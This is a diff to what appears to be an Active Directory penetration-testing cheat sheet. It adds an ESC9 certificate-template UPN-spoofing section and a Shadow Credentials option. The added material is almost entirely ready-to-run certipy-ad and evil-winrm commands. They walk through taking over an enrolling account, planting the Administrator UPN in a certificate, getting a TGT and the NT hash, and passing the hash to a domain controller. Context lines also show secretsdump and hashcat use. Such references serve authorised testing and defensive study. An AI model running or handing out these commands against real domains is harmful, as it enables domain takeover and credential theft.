@@ -125,6 +125,47 @@ impacket-secretsdump -hashes :DC_NTLM_HASH $DOMAIN/'DC$'@$DC_IP
 
 ---
 
+## ESC9 - No Security Extension (UPN Spoofing)
+
+**Conditions required:**
+1. Template has `NoSecurityExtension` in Enrollment Flag (`CT_FLAG_NO_SECURITY_EXTENSION` / `0x80000` in `msPKI-Enrollment-Flag`)
+2. Template has Client Authentication EKU
+3. Attacker has GenericWrite (or higher) over an account that can enroll in the template
+
+Normally issued certificates embed the enrolling account's objectSid (`szOID_NTDS_CA_SECURITY_EXT`). The KDC verifies the SID in the cert matches the account it resolves from the UPN. Without this extension there is no SID binding — the KDC trusts the UPN in the cert at auth time. Changing the enrolling account's UPN to a high-privilege target before enrolling plants that UPN in the issued cert.
+
+```bash
+# 1. Detect — look for: "NoSecurityExtension" in Enrollment Flag, Client Authentication EKU
+certipy-ad find -u user@$DOMAIN -p 'password' -dc-ip $DC_IP -stdout -vulnerable
+
+# 2. Get credentials for the enrolling account (e.g. via Shadow Credentials if GenericWrite)
+certipy-ad shadow auto -u attacker@$DOMAIN -p 'password' \
+  -account enrolling_account -target $DOMAIN -dc-ip $DC_IP
+
+# 3. Change enrolling account's UPN to the target (done as attacker with GenericWrite/GenericAll)
+certipy-ad account update -u attacker@$DOMAIN -p 'password' \
+  -user enrolling_account -upn Administrator -dc-ip $DC_IP
+
+# 4. Request certificate as the enrolling account — CA issues it with UPN 'Administrator'
+#    "Certificate has no object SID" in the output confirms the ESC9 condition
+certipy-ad req -u enrolling_account@$DOMAIN -p 'password' \
+  -ca '<CA-NAME>' -template '<ESC9Template>' -dc-ip $DC_IP
+
+# 5. Restore the enrolling account's UPN before authenticating
+certipy-ad account update -u attacker@$DOMAIN -p 'password' \
+  -user enrolling_account -upn enrolling_account@$DOMAIN -dc-ip $DC_IP
+
+# 6. Authenticate — KDC resolves UPN 'Administrator' from the cert, issues TGT for Administrator
+certipy-ad auth -pfx administrator.pfx -domain $DOMAIN -dc-ip $DC_IP
+
+# 7. Pass-the-hash
+evil-winrm -i $DC_IP -u Administrator -H <NT_HASH>
+```
+
+> Note: step 5 (restoring the UPN) must happen before step 6. If two accounts share the same UPN at auth time the lookup is ambiguous and authentication fails.
+
+---
+
 ## Coercion Attacks
 
 Force a machine (especially DCs) to authenticate to you for relay or hash capture.
@@ -173,6 +214,13 @@ hashcat -m 13100 krb.txt /usr/share/wordlists/rockyou.txt
 # Clean up:
 bloodyAD --host $DC_IP -d $DOMAIN -u attacker -p 'password' \
   remove object targetuser servicePrincipalName
+
+# Option C: Shadow Credentials (requires ADCS / PKINIT in the environment)
+# Writes a Key Credential to msDS-KeyCredentialLink, authenticates with PKINIT, retrieves NT hash, restores original credentials
+certipy-ad shadow auto -u attacker@$DOMAIN -p 'password' \
+  -account targetuser -target $DOMAIN -dc-ip $DC_IP
+# Pass-the-hash with recovered hash:
+evil-winrm -i $DC_IP -u targetuser -H <NT_HASH>
 ```
 
 ### GenericAll / GenericWrite on Computer
